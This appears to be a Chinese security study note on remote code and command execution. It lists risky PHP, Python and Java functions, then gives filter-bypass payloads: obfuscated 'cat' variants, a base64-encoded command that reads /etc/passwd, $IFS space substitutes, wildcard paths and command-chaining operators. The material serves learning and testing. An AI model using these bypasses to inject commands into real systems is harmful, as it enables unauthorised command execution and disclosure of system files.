---
title: RCE
date: 2001-01-01
tags:
  - 基础漏洞
categories:
  - 安全相关
---
RCE（remote code execute / remote command execute）

## 可能存在隐患的函数

### PHP

代码执行函数：`eval()`、`assert()`、`preg_replace()`、`create_function()`、`array_map()`、`call_user_func()`、`call_user_func_array()`、`array_filter()`、`uasort()`等；

命令执行函数：`system()`、`exec()`、`shell_exec()`、`pcntl_exec()`、`popen()`、`proc_popen()`、`passthru()`等；

### Python

`eval`、`exec`、`subprocess`、`os.system`、`commands`等；

### Java

Java 中没有类似 php 中 eval 函数这总可以将字符串转化为代码执行的函数，但有反射机制，并且有各种基于反射机制的表达式引擎，如：OGNL、SpEL、MVEL 等。

## 可能得功能点

在线编程、 系统面板等；或可能通过其他漏洞所引发：注入、文件包含、文件上传（eg：功能是将上传的文件移动到指定文件夹中，这样通过拼接命令可导致命令执行）、反序列化等；

## 命令执行的绕过技巧

### 查看文件

eg：`cat`命令被过滤

```txt
ca""t
ca\t
more：一页一页的显示档案内容
less：与 more 类似
head：查看头几行
tac：从最后一行开始显示，可以看出 tac 是 cat 的反向显示
tail：查看尾几行
nl：显示的时候，顺便输出行号
od：od指令会读取所给予的文件的内容，并将其内容以八进制字码呈现出来
vi：一种编辑器，这个也可以查看
vim：一种编辑器，这个也可以查看
sort：将文本文件内容加以 ASCII 码的次序排列
uniq：用于检查及删除文本文件中重复出现的行列
file -f：报错出具体内容
paste：把每个文件以列对列的方式，一列列地加以合并
反引号+base64编码：`echo Y2F0IC9ldGMvcGFzc3dk |base64 -d`
```

### 空格被过滤

尝试以下符号绕过

```txt
< 、<>、$IFS$9、${IFS}、$IFS、$IFS[*]、$IFS[@]等
```

### 文件名被过滤

eg：`/etc/passwd`

```txt
/e?c/?asswd
/e*c/*asswd
/??c/?asswd
/??c/?assw?
```

### 绕过输入内容执行命令

```txt
1. cmd1;cmd2：cmd1执行完再执行cmd2，windows下无法用（;）
2. cmd1|cmd2：不管cmd1命令成功与否，都会去执行cmd2命令
3. cmd1||cmd2：首先执行cmd1命令再执行cmd2命令，如果cmd1命令执行成功，就不会执行cmd2命令；相反，如果cmd1命令执行不成功，就会执行cmd2命令。
4. cmd1&cmd2：&也叫后台任务符，代表首先执行命令cmd1，把cmd1放到后台执行再执行命令cmd2，如果cmd1执行失败，还是会继续执行命令cmd2。也就是说命令cmd2的执行不会受到命令cmd1的干扰。
5. cmd1&&cmd2：首先执行命令cmd1再执行命令cmd2，但是前提条件是命令cmd1执行正确才会执行命令cmd2，在cmd1执行失败的情况下不会执行cmd2命令。所以又被称为短路运算符。
```


